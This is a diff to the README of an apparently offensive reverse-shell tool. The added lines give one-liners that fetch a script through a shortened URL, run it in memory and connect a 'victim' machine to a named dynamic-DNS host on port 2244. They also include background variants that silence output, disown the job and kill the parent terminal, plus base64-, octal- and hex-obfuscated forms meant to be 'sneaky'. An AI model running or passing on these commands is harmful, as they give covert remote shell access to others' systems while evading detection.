@@ -58,8 +58,104 @@ source <(curl -sSL https://raw.githubusercontent.com/x86david/multiplatform_kali
 ### Execution via Remote Pipe (Linux Victim)
 Execute the shell directly in memory without leaving files on disk:
 ```bash
-bash <(curl -sSL https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/victim.sh) 10.0.13.7 2222 mysecretpass
+bash <(curl -sSL https://tinyurl.com/sheepx) 10.0.13.7 2222 mysecretpass
 ```
+
+Nohup version:
+```bash
+nohup bash -c "bash <(curl -sSL https://tinyurl.com/sheepx) x86david.ddns.net 2244 password" > /dev/null 2>&1 & disown; clear; kill -9 $PPID
+```
+
+Brief Breakdown
+
+    nohup ... &: Runs the command in the background and keeps it alive after you log out.
+
+    bash -c "...": Allows nohup to run complex logic (like the curl pipe) as a single task.
+
+    bash <(curl ...): Downloads and executes a script directly from a URL into memory (no file saved to disk).
+
+    > /dev/null 2>&1: Completely silences the command by blocking all logs and error messages.
+
+    disown: Tells the shell to "forget" the background job so it doesn't block the exit.
+
+    kill -9 $PPID: Force-kills the Parent Process ID (the terminal window itself), ensuring the session closes even if multiple shells are nested.
+
+
+
+
+
+This ones are more sneaky... Remember, use cyberchef to replace the Hex and base64 strings with your commands or parameters....
+
+[CyberChef]https://gchq.github.io/CyberChef
+
+
+If nohup is available, it's useful to keep the shell alive when user exits the terminal. It's up to you.
+
+```bash
+nohup command_name > /dev/null 2>&1 &
+```
+
+
+## Kill the sub-processes if you need to later on:
+
+Find them:
+```bash
+ps aux | grep -E 'x86david|2244'
+```
+Kill by name or number
+```bash
+pkill -f "x86david"
+```
+Check alive connections in that port: 
+```bash
+ss -antp | grep 2244
+```
+
+
+## Normal obfuscated commands
+
+Base64 version
+```bash
+bash <(curl -sSL $(echo "aHR0cHM6Ly90aW55dXJsLmNvbS9zaGVlcHg=" | base64 -d)) \
+  $(echo "eDg2ZGF2aWQuZGRucy5uZXQ=" | base64 -d) \
+  $(echo "MjI0NA==" | base64 -d) \
+  $(echo "cGFzc3dvcmQ=" | base64 -d)
+```
+
+Octal/Mixed version
+```bash
+bash <(curl -sSL $(printf '\150\164\164\160\163\72\57\57\164\151\156\171\165\162\154\56\143\157\155\57\163\150\145\145\160\170')) \
+  $(printf '\170\70\66\144\141\166\151\144\56\144\144\156\163\56\156\145\164') \
+  $(echo "MjI0NA==" | base64 -d) \
+  $(printf '\160\141\163\163\167\157\162\144')
+```
+
+Hex/Eval version
+```bash
+eval "$(printf '\x62\x61\x73\x68\x20\x3c\x28\x63\x75\x72\x6c\x20\x2d\x73\x53\x4c\x20\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x69\x6e\x79\x75\x72\x6c\x2e\x63\x6f\x6d\x2f\x73\x68\x65\x65\x70\x78\x29\x20\x78\x38\x36\x64\x61\x76\x69\x64\x2e\x64\x64\x6e\x73\x2e\x6e\x65\x74\x20\x32\x32\x34\x34\x20\x70\x61\x73\x73\x77\x6f\x72\x64')"
+```
+## NOHUP (BACKGROUND) obfuscated commands
+
+Don't kill the parent process if you don't want to.
+
+Base64 version
+```bash
+nohup bash -c "bash <(curl -sSL \$(echo 'aHR0cHM6Ly90aW55dXJsLmNvbS9zaGVlcHg=' | base64 -d)) \$(echo 'eDg2ZGF2aWQuZGRucy5uZXQ=' | base64 -d) \$(echo 'MjI0NA==' | base64 -d) \$(echo 'cGFzc3dvcmQ=' | base64 -d)" > /dev/null 2>&1 & disown; clear; kill -9 $PPID
+
+```
+
+Octal/Mixed version
+```bash
+nohup bash -c "bash <(curl -sSL \$(printf '\150\164\164\160\163\72\57\57\164\151\156\171\165\162\154\56\143\157\155\57\163\150\145\145\160\170')) \$(printf '\170\70\66\144\141\166\151\144\56\144\144\156\163\56\156\145\164') \$(echo 'MjI0NA==' | base64 -d) \$(printf '\160\141\163\163\167\157\162\144')" > /dev/null 2>&1 & disown; clear; kill -9 $PPID
+
+```
+Hex/Eval version
+```bash
+nohup bash -c "eval \"\$(printf '\x62\x61\x73\x68\x20\x3c\x28\x63\x75\x72\x6c\x20\x2d\x73\x53\x4c\x20\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x69\x6e\x79\x75\x72\x6c\x2e\x63\x6f\x6d\x2f\x73\x68\x65\x65\x70\x78\x29\x20\x78\x38\x36\x64\x61\x76\x69\x64\x2e\x64\x64\x6e\x73\x2e\x6e\x65\x74\x20\x32\x32\x34\x34\x20\x70\x61\x73\x73\x77\x6f\x72\x64')\"" > /dev/null 2>&1 & disown; clear; kill -9 $PPID
+```
+
+
+
 
 ### Execution via CMD (Windows Victim)
 Run the one-liner from a standard CMD prompt:
